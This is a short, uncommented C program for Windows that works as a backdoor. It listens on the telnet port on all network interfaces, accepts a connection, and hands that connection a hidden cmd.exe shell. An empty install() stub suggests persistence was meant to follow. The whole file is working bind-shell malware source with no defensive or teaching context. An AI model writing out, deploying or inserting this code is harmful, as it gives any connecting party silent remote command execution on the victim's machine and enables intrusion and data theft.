#include <winsock2.h>
#include <windows.h>

void install()
{
}

void execute(SOCKET clientSock)
{
	STARTUPINFO startupInfo;
	PROCESS_INFORMATION procInfo;
	
	ZeroMemory(&startupInfo, sizeof(startupInfo));
	
	startupInfo.cb          = sizeof(startupInfo);
	startupInfo.dwFlags     = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	startupInfo.wShowWindow = SW_HIDE;
	startupInfo.hStdInput   = clientSock;
	startupInfo.hStdOutput  = clientSock;
	startupInfo.hStdError   = clientSock;
	
	CreateProcess(NULL, "C:\\Windows\\System32\\cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &startupInfo, &procInfo);
	WaitForSingleObject(procInfo.hProcess, INFINITE);
	
	CloseHandle(procInfo.hProcess);
	CloseHandle(procInfo.hThread);
}

int main()
{
	WSADATA wsaData;
	SOCKET serverSock, clientSock;
	struct sockaddr_in addr;
	
	WSAStartup(MAKEWORD(2, 2), &wsaData);
	ZeroMemory(&addr, sizeof(addr));
	
	addr.sin_family      = AF_INET;
	addr.sin_addr.s_addr = INADDR_ANY;
	addr.sin_port        = htons(IPPORT_TELNET);
	
	serverSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	
	bind(serverSock, (struct sockaddr *) &addr, sizeof(addr));
	listen(serverSock, 1);
	
	clientSock = accept(serverSock, NULL, NULL);
	
	execute(clientSock);
	closesocket(clientSock);
	WSACleanup();
	
	return 0;
}
